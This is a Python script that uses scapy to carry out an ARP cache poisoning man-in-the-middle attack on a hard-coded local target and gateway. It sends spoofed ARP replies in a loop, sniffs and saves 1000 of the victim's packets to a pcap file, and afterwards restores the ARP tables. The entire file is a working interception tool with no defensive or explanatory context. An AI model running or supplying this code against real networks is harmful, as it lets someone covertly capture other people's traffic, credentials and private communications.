from scapy.all import *
import os
import sys
import threading
import signal

interface = "en1"
tip = "192.168.0.4"
gip = "192.168.0.1"
packetc = 1000

conf.iface = interface

conf.verb = 0


def restore_target(gip, gatemac, tip, tarMac):
    print("[*] Restoring target...")
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gip, hwsrc=tarMac, psrc=tip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=tip, hwsrc=gatemac, psrc=gip), count=5)
    print("[*] Disabling IP forwarding")
    # Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    # kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

def getmac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

def poisonTarget(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)



print("[*] Setting up interface %s" % interface)

gatemac = getmac(gip)

if gatemac is None:
    print("[!!!] Failed to gateway MAC. Exiting")
    sys.exit(0)
else:
    print("[*] Gateway %s is at %s" % (gip, gatemac))

tarMac = getmac(tip)

if tarMac is None:
    print("[!!!] Failed to target MAC. Exiting")
    sys.exit(0)
else:
    print("[*] Target %s is at %s" % (tip, tarMac))

poisonThread = threading.Thread(target=poisonTarget, args=(gip, gatemac, tip, tarMac))
poisonThread.start()

try:
    print("[*] Starting sniffer for %d packets" % packetc)

    ffilter = "ip host %s" % tip

    packets = sniff(count=packetc, filter=ffilter, iface=interface)
    wrpcap('arper.pcap', packets)

    restore_target(gip, gatemac,tip,tarMac)

except KeyboardInterrupt:
    restore_target(gip, gatemac,tip,tarMac)
    sys.exit(0)


